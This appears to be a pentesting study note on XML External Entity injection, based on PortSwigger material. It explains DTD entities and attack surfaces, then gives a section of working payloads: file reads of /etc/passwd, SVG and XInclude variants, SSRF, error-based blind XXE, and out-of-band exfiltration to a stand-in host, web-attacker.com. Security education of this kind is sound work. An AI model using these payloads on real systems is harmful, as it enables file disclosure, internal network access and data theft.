# XML eXternal Entity injection
When XML parsers support potentially dangerous features, that allows an attacker to inject specific XML payloads that can compromise the server.

It arises when the submitted XML is not validated or defended properly. An attacker must:
- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file (to read)
- Edit a data value in the XML that is returned to the applications response, to make use of the defined external entity

### XML
The eXtensible Markup Language is used for data storing and stuff. The Document Type Definition (DTD) contains declarations that define the structure of an XML document. The DTD is declared in the DOCTYPE element. Using the DTD, custom XML entities can be defined. For example:
```xml
<!DOCTYPE foo [ <!ENTITY myentity "my new value lol" > ]>
```
This now means that any refernce to `&myentity;` within the XML document will be replaced with the defined value.

External entities use the keyword `SYSTEM` and must specify a website with the `http(s)://` protocol, or a path to file with the `file://` protocol. See example [here](#read-file).

There are also XML parameter entities. These are defined with the `%` character before the name, and are referenced using `%myparameterentity;`. Parameter entities can only be used within the DTD:
```xml
<!DOCTYPE foo [ <!ENTITY % myparameterentity "my parameter entity value" > %myparameterentity; ]>
```

## Vulnerabilities & Attack Surfaces
Try reformatting request content to type `text/xml`, because sometimes this is allowed by the server. This can reveal more attack surfaces. Like this:
```xml
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

### XInclude
It is not always possible to inject a new DOCTYPE element. Then you can always try to use XInclude which can be placed in any data value. [PoC](#xinclude--read-file)

Useful when you only control a single data field that is placed into a server-side XML document.

### File Upload
When you are allowed to upload files which are processed server-side. When it is possible to upload XML-based file formats like `.docx` and `.svg`, an attacker can upload malicious files with an XXE payload. [PoC](#svg--read-file)

### Blind XXE
When you don't get any data returned from the application, it might be hard to retrieve data, or to know if the attack worked. 
- Use OAST techniques to get info through an attacker controlled domain [PoC](#blind-xxe--read-file)
- Make use of error messages that include sensitive information [PoC](#blind-xxe--error)
- In internal DTD, it is (most likely) not allowed to use XML parameter entities with the definition of another. It is permitted in external DTDs, but not internal DTDs. This is when you can make use of common internal DTDs to still retrieve data [PoC](#blind-xxe--internal-dtd). XML is chill like that.

## Proof of Concepts

### Read File
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### XInclude | Read File
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### SVG | Read File
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XXE -> SSRF
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### Blind XXE | Read File
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
]>
```

### Blind XXE | Error
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
```

### Blind XXE | Internal DTD
This for Linux systems using the GNOME desktop environment that often have a [DTD file](https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd) at `/usr/share/yelp/dtd/docbookx.dtd`, which defines a parameter entity `ISOamsa`.
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

# Sources
- Main info (Portswigger): https://portswigger.net/web-security/xxe